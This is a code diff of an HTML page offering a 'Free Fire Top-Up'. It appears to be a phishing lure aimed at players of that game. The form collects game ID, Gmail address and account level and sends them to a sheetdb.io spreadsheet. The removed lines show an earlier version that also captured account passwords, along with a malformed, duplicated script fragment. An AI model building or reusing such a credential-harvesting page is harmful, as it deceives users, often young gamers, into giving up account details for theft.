@@ -3,7 +3,6 @@
 <head>
 <title>Free Fire Top-Up</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <style>
 body{
     margin:0;
@@ -67,13 +66,12 @@ button{
 <input type="text" name="Free Fire ID" placeholder="Free Fire ID" required>
 <input type="number" name="Diamond Amour" placeholder="Diamond Amount" required>
 <input type="email" name="Gmail" placeholder="Gmail" required>
-<input type="text" name="password" placeholder="Password" required>
 <input type="number" name="ID Level" placeholder="ID Level" required>
 <button type="submit">Submit</button>
 </form>
 </div>
 
-<div id="popup">✅ Data Saved Successfully</div>
+<div id="popup">✅ Data Saved</div>
 
 <script>
 const form = document.getElementById("myForm");
@@ -88,50 +86,24 @@ form.addEventListener("submit", function(e){
             "Free Fire ID": form["Free Fire ID"].value,
             "Diamond Amour": form["Diamond Amour"].value,
             "Gmail": form["Gmail"].value,
-            "password": form["password"].value,
             "ID Level": form["ID Level"].value
         }
     };
 
     fetch("https://sheetdb.io/api/v1/u6gofj5hpzd2q",{
         method:"POST",
-        headers:{
-            "Content-Type":"application/json"
-        },
-        body:JSON.stringify(data)
+        headers:{ "Content-Type":"application/json" },
+        body: JSON.stringify(data)
     })
-    .then(res=>res.json())
-    .then(response=>{
+    .then(r=>r.json())
+    .then(()=>{
         popup.style.display="block";
         setTimeout(()=>popup.style.display="none",2000);
         form.reset();
     })
-    .catch(err=>{
-        alert("Error ❌");
-        console.log(err);
-    });
+    .catch(e=>alert("Error"));
 });
 </script>
 
-</body>
-</html                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "Accept": "application/json"
-                },
-                body: JSON.stringify(formData)
-            })
-            .then(response => response.json())
-            .then(data => {
-                popup.style.display = "block";
-                setTimeout(()=> popup.style.display = "none", 2000);
-                form.reset();
-            })
-            .catch(err => {
-                console.log(err);
-                alert("Error Saving Data ❌ Check console");
-            });
-        });
-    </script>
 </body>
 </html>
